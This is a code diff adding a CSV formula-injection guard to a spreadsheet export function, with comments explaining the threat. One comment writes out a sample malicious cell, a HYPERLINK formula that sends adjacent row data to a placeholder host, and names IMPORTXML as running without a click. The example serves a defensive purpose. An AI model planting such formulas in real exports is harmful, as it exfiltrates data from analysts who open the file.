@@ -7,11 +7,42 @@ import type { Cell, SheetData } from "write-excel-file/browser";
 
 import type { BiColumnFormat } from "@/lib/biAgent";
 
-/** RFC-4180-style CSV escaping (quote when the value has a comma/quote/newline). */
+/**
+ * A value a spreadsheet would execute rather than display.
+ *
+ * Excel, LibreOffice and Google Sheets treat a leading `=`, `+`, `-`, `@`, tab
+ * or carriage return as the start of a FORMULA (CWE-1236). RFC-4180 quoting
+ * does not help: the quotes are consumed by the CSV parser and the cell is
+ * still a formula.
+ *
+ * This matters here because rows are not all typed by the person exporting
+ * them — they arrive from SaaS connector syncs (Stripe, Shopify, HubSpot,
+ * Salesforce), from datasets shared by another tenant, and from warehouse
+ * queries. A cell reading `=HYPERLINK("https://x/?d="&A1,"Open")` exfiltrates
+ * the row next to it when an analyst opens the export and clicks; Sheets runs
+ * `=IMPORTXML(...)` with no click at all.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/** A value that only LOOKS like a formula because negative numbers start "-". */
+const PLAIN_NUMBER = /^[-+]?(\d+\.?\d*|\.\d+)([eE][-+]?\d+)?$/;
+
+/**
+ * RFC-4180-style CSV escaping (quote when the value has a comma/quote/newline),
+ * plus a leading apostrophe on anything a spreadsheet would run as a formula.
+ *
+ * The apostrophe is the standard neutraliser: spreadsheets strip it on display
+ * and treat the rest as text. Numbers are exempt so `-5` stays `-5` — guarding
+ * them would corrupt every negative figure in an export.
+ */
 function csvEscape(v: unknown): string {
   const s = v === null || v === undefined ? "" : String(v);
-  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  const safe = FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s) ? `'${s}` : s;
+  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
+
+/** Exported for the tests that pin the injection guard. */
+export const __csvEscape = csvEscape;
 
 function triggerDownload(blob: Blob, filename: string): void {
   const a = document.createElement("a");
